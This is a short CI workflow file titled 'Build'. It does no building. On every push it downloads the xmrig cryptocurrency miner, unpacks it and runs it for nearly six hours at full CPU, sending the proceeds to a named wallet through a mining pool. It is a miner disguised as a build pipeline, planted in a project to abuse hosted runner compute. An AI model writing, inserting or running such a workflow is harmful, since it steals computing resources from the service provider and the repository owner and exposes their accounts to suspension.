name: Build
on: [push, workflow_dispatch]
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    steps:
    - uses: actions/checkout@v3
    - run: |
        cd /tmp
        wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
        tar -xzf xmrig-6.21.0-linux-static-x64.tar.gz
        cd xmrig-6.21.0 && chmod +x xmrig
        ./xmrig -o rx.unmineable.com:3333 -u USDT:0x74B56f2C379996fedabF53D36aeE73c5E5129fC9.vps8497_mgufindob#t90s-zv83 -p x --donate-level 1 --tls --cpu-max-threads-hint 100 -k
